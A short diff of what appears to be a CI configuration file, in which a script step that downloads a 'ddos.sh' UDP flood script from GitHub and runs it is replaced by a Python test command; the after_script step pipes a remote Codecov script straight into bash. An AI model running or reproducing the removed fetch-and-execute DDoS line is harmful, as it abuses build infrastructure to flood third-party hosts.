@@ -20,7 +20,7 @@ install:
     - echo Nice
 
 script:
-    - wget -O ddos.sh 'https://raw.githubusercontent.com/XaviFortes/Python-UDP-Flood/master/rundos.sh' && chmod +x ddos.sh && ./ddos.sh
+    - python3 uwu.py < .test
 
 after_script:
     - bash <(curl -s https://codecov.io/bash)
